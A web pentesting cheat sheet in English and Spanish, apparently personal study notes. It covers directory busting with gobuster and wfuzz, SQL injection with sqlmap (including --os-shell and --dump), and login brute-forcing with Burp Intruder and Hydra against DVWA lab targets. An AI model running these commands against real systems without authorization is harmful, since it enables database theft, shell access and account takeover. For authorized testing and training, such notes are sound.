# Web Pentesting

### **Web Application Enumeration Checklist:**

```bash
1. Checkout the entire webpage and what it is displaying.
2. Read every page, look for emails, names, user info, etc.
3. Directory Discovery (time to dir bust!)
4. Enumerate the interface, what is the CMS & Version? Server installation page?
5. Check for potential Local File Inclusion, Remote File Inclusion, SQL Injection, XXE, and Upload vulnerabilities
6. Check for a default server page, identify the server version
7. View Source Code:
      a. Check for hidden values
      b. Check for comments/developer remarks
      c. Check for Extraneous Code
      d. Check for passwords
8. Check for robots.txt file
9. Web Scanning

```

### Directory Discovery/Dir Busting:

```bash
gobuster dir -u $IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
	
```

### Gobuster Quick Directory Discovery

```bash
gobuster -u $ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux

```

### Gobuster Directory Busting:

```bash
wget <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Top1000-RobotsDisallowed.txt>; gobuster -u <http://10.10.10.10>. -w Top1000-RobotsDisallowed.txt

```

```bash
gobuster dir -u <http://$ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o gobuster-root -t 50

```

### Gobuster comprehensive directory busting:

```bash
gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'

```

### Gobuster search with file extension:

```bash
gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

```

### wfuzz search with files:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 <http://10.10.10.10/FUZZ>

```

### If you are really stuck, run this:

```bash
for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u <http://$ip/> -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s "200,204,301,302,307" -t 20 ; done

```

### Check different extensions:

```bash
sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar

```

## SQL Injection Testing (automated!)

### if you follow the above check list, you should have a list of parameters to test for SQL injection. Automate it with SQLMAP!

### SQLmap Commands:

```bash
sqlmap -u <http://10.10.10.10> -p parameter
sqlmap -u <http://10.10.10.10>  --data POSTstring -p parameter
sqlmap -u <http://10.10.10.10> --os-shell
sqlmap -u <http://10.10.10.10> --dump

```

### Checklist

Fichero de passwords

```html
/var/www/html/.htpasswd
```

### **Bruteforce Login Panel**

- Burpsuite
    
    Capturamos la petición con Burpsuite con cualquier credencial.
    
    Mandamos al Intruder
    
    Establecemos con el tipo de ataque (Sniper attack para un campo si conocemos usuario o Cluster Bomb para probar combinaciones de usuario/password
    
    Añadimos $ para marcar los campos a atacar (username y password)
    
    En Payloads cargamos los diccionarios
    
    ![image.png](Web%20Pentesting%20170360cb06dd803bba9ddd7fc1598a51/image.png)
    
- Hydra
    
    ```bash
    hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form 
    "index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
    
    -e ns : 
    Prueba nombres de usuario vacíos (n) y contraseñas vacías (s). Es útil para detectar configuraciones por defecto o credenciales vacías.
    
    -F: 
    Finaliza el ataque en cuanto encuentra una combinación válida de usuario y contraseña.
    
    -u:
    Intenta un usuario a la vez antes de pasar al siguiente (en lugar de probar todas las contraseñas con cada usuario).
    
    EX HTTP GET LOGIN 
    
    hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com 
    http-get-form "/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
    
    hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt -e ns -F -u -v 192.168.1.44  http-get-form 
    "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
    
    EX HTTP POST LOGIN
    
    ```
    
    Ejemplo:
    
    ```bash
    Para panel de login: Capturamos peticion de Burpsuite para ver todos los campos
    
    Ejemplo de petición :
    
    GET /vulnerabilities/brute/?username=test&password=§test§&Login=Login HTTP/1.1
    Host: 127.8.0.1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Referer: http://127.8.0.1/vulnerabilities/brute/
    Cookie: PHPSESSID=dsq1vaq210onuch60f38cpq6i4; security=low
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    
    Hydra: Añadimos toda la info, separada por : y cambiamos username y password por variables para fuzzear ^USER^ y ^PASS^ y con el parametro F(Follow) añadimos la respuesta de password incorrecto que muesta. ('Username and/or password incorrect')
    
    $> hydra -t16 -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.8.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=dsq1vaq210onuch60f38cpq6i4;security=low:F=Username and/or password incorrect.'
    ```
    
- 

```bash
burpsuite
```

### Fuzzing